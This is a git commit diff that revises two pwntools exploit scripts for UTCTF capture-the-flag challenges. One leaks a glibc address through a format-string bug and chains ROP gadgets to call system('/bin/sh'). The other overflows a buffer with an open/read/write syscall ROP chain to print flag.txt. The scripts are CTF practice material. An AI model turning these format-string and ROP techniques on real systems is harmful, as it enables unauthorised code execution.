bac64f34e85c1696bf575c0f8a1517b861e827b9
XinshengZhu <xinsheng.zhu.ny@gmail.com>
2025-07-05 23:03:09 +0800

    Update UTCTF

--- UTCTF/RETirementPlan/retirement_plan.py
+++ UTCTF/RETirementPlan/retirement_plan.py
@@ -4,65 +4,33 @@ context.arch = 'amd64'
 context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
 
-environ = {
-    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'), 
-    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
-}
-
-p = gdb.debug('./shellcode_patched', env=environ, gdbscript='''
-    b *main+33
-    b *main+270
+p = gdb.debug('./shellcode_patched', '''
+    b *(main+33)
+    b *(main+270)
     continue
 ''')
 
 # p = remote('challenge.utctf.live', 9009)
 
-# def transform_payload(payload):
-#     '''
-#     This function reverses the binary's transformation algorithm:
-#     - If transformed character would be alphabetic, reverse with: char = -0x65 - char
-#     - If transformed character would be digit, reverse with: char = -0x25 - char
-#     - Otherwise, character remains unchanged
-#     '''
-#     result = bytearray()
-#     for byte in payload:
-#         # Check if the byte is an alphabet character (a-z or A-Z)
-#         if (ord('a') <= byte <= ord('z')) or (ord('A') <= byte <= ord('Z')):
-#             # Calculate the symmetrical letter
-#             if ord('a') <= byte <= ord('z'):
-#                 # For lowercase: a->z, b->y, c->x, etc.
-#                 symmetrical = ord('z') - (byte - ord('a'))
-#             else:
-#                 # For uppercase: A->Z, B->Y, C->X, etc.
-#                 symmetrical = ord('Z') - (byte - ord('A'))
-#             result.append(symmetrical)
-#         else:
-#             # Keep non-alphabet bytes unchanged
-#             result.append(byte)
-    
-#     return bytes(result)
+# 1. leak glibc base address with fmtstr
+# from <main+00f0> to <main+00f7) (0x400706-0x40070d): mov rax, QWORD PTR [rbp-0x10]; add rax, rdx; movzx eax, BYTE PTR [rax];
+# ensuring rdx=0 within these instructions, qword data at rbp-0x10 has to be an available address
+FAKE_RBP_MINUS_HEX_10 = 0x601800
+MAIN_USABLE = 0x400617
+p.sendlineafter(b"<Insert prompt here>: \n", b'%3$p'+b'\0'*(0x30-4)+p64(FAKE_RBP_MINUS_HEX_10)+b'\0'*0x10+p64(MAIN_USABLE))
+glibc_base_addr = int(p.recv(14), 16)-0x3c48e0
+log.info(f"glibc base addr: {hex(glibc_base_addr)}")
 
-p.recvuntil(b'<Insert prompt here>: \n')
-p.sendline(b'%3$p%23$p'+b'\0'*(0x30-9)+p64(0x601051)+b'\0'*0x10+p64(0x400616))
-
-leaks = p.recv(28).strip().decode()
-print(leaks)
-glibc_base_addr = int(leaks[0:14], 16)-0x3c48e0
-log.info(f'glibc base addr: {hex(glibc_base_addr)}')
-stack_addr = int(leaks[14:28], 16)
-log.info(f'stack addr: {hex(stack_addr)}')
-
-glibc_r = ROP('./libc.so.6')
+# 2. ROP to pop a shell
 glibc_e = ELF('./libc.so.6')
 chain = [
-    glibc_r.rdi.address + glibc_base_addr,
-    next(glibc_e.search(b"/bin/sh")) + glibc_base_addr,
-    glibc_r.ret.address + glibc_base_addr,
-    glibc_e.symbols.system + glibc_base_addr
+    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
+    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
+    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
+    glibc_base_addr+glibc_e.sym.system
 ]
-
-p.recvuntil(b'<Insert prompt here>: \n')
-p.sendline(b'\0'*0x30+p64(0x601051)+b'\0'*0x10+b''.join([p64(c) for c in chain]))
+# same as above, qword data at rbp-0x10 has to be an available address
+p.sendlineafter(b'<Insert prompt here>: \n', b'\0'*0x30+p64(FAKE_RBP_MINUS_HEX_10)+b'\0'*0x10+b''.join([p64(c) for c in chain]))
 
 p.interactive()
 
--- UTCTF/secbof/secbof.py
+++ UTCTF/secbof/secbof.py
@@ -11,78 +11,55 @@ p = gdb.debug('./chal', '''
 
 # p = remote('challenge.utctf.live', 5141)
 
-# Syscall numbers
+# ROP to retrieve flag (open, read, write, exit)
+# syscall numbers
 SYS_READ = 0
 SYS_WRITE = 1
 SYS_OPEN = 2
 SYS_EXIT = 60
-
-# Gadgets for setting up syscalls
-# ROPgadget --binary chal --only "pop|ret" | grep -E "pop rax|pop rdi|pop rsi|pop rdx" | head -10
-POP_RAX = 0x450507       # pop rax; ret
-POP_RDI = 0x40204f       # pop rdi; ret
-POP_RSI = 0x40a0be       # pop rsi; ret
-POP_RDX_RBX = 0x48630b   # pop rdx; pop rbx; ret
-# objdump -d chal | grep -A1 "syscall" | grep "ret"
-SYSCALL_RET = 0x41ae16   # syscall; ret
-
-# BSS section for storing our filename and read buffer
-# readelf -S chal | grep .bss
-BSS = 0x4c82a0
-FILENAME_ADDR = BSS
-BUFFER_ADDR = BSS + 16  # More space for filename
-
+# gadgets for setting up syscalls
+POP_RAX_RET = 0x450507
+POP_RDI_RET = 0x40204f
+POP_RSI_RET = 0x40a0be
+POP_RDX_RBX_RET = 0x48630b
+SYSCALL_RET = 0x41ae16
+# addresses in bss section for filename and buffer
+FILENAME_ADDR = 0x4c82a0
+BUFFER_ADDR = 0x4c82a0+0x10
 # ROP chain
 chain = [
-    # 1. Read filename from stdin
-    POP_RAX, SYS_READ,         # rax = 0 (read syscall)
-    POP_RDI, 0,                # rdi = 0 (stdin)
-    POP_RSI, FILENAME_ADDR,    # rsi = address to store filename
-    POP_RDX_RBX, 16, 0,        # rdx = 16 (read up to 16 bytes for filename)
-    SYSCALL_RET,               # syscall; ret
-    
-    # 2. Open the file
-    POP_RAX, SYS_OPEN,         # rax = 2 (open syscall)
-    POP_RDI, FILENAME_ADDR,    # rdi = pointer to filename
-    POP_RSI, 0,                # rsi = 0 (O_RDONLY)
-    POP_RDX_RBX, 0, 0,         # rdx = 0 (mode, not used for O_RDONLY)
-    SYSCALL_RET,               # syscall; ret
-    
-    # 3. Read the flag
-    # After open, the file descriptor is typically more than3 (stdin=0, stdout=1, stderr=2)
-    POP_RDI, 5,                # rdi = 5 (file descriptor)
-    POP_RAX, SYS_READ,         # rax = 0 (read syscall)
-    POP_RSI, BUFFER_ADDR,      # rsi = buffer address
-    POP_RDX_RBX, 100, 0,       # rdx = 100 (count)
-    SYSCALL_RET,               # syscall; ret
-    
-    # 4. Write the flag to stdout
-    POP_RAX, SYS_WRITE,        # rax = 1 (write syscall)
-    POP_RDI, 1,                # rdi = 1 (stdout)
-    POP_RSI, BUFFER_ADDR,      # rsi = buffer address
-    POP_RDX_RBX, 100, 0,       # rdx = 100 (count)
-    SYSCALL_RET,               # syscall; ret
-    
-    # 5. Exit cleanly
-    POP_RAX, SYS_EXIT,         # rax = 60 (exit syscall)
-    POP_RDI, 0,                # rdi = 0 (status)
-    SYSCALL_RET                # syscall; ret
+    # read(0, FILENAME_ADDR, 16)
+    POP_RAX_RET, SYS_READ,
+    POP_RDI_RET, 0,
+    POP_RSI_RET, FILENAME_ADDR,
+    POP_RDX_RBX_RET, 16, 0,
+    SYSCALL_RET,
+    # open(FILENAME_ADDR, 0)
+    POP_RAX_RET, SYS_OPEN,
+    POP_RDI_RET, FILENAME_ADDR,
+    POP_RSI_RET, 0,
+    POP_RDX_RBX_RET, 0, 0,
+    SYSCALL_RET,
+    # read(3, BUFFER_ADDR, 100)
+    # rdi=5 for remote
+    POP_RDI_RET, 3,
+    POP_RAX_RET, SYS_READ,
+    POP_RSI_RET, BUFFER_ADDR,
+    POP_RDX_RBX_RET, 100, 0,
+    SYSCALL_RET,
+    # write(1, BUFFER_ADDR, 100)
+    POP_RAX_RET, SYS_WRITE,
+    POP_RDI_RET, 1,
+    POP_RSI_RET, BUFFER_ADDR,
+    POP_RDX_RBX_RET, 100, 0,
+    SYSCALL_RET,
+    # exit(0)
+    POP_RAX_RET, SYS_EXIT,
+    POP_RDI_RET, 0,
+    SYSCALL_RET,
 ]
-
-# Create the payload
-payload = b'\x00' * 0x88  # Padding to reach the return address
-
-# Add the ROP chain
-for gadget in chain:
-    payload += p64(gadget) if isinstance(gadget, int) else gadget
-
-# Send the payload
-p.recvuntil(b'Input> ')
-p.send(payload)
-
-# After our payload is sent, we need to send the filename
-p.recvuntil(b'Flag: ')
-p.send(b'./flag.txt\x00')
+p.sendafter(b"Input> ", b'\x00'*0x88+b''.join(p64(c) for c in chain))
+p.sendafter(b"Flag: ", b'./flag.txt\x00')
 
 p.interactive()
 
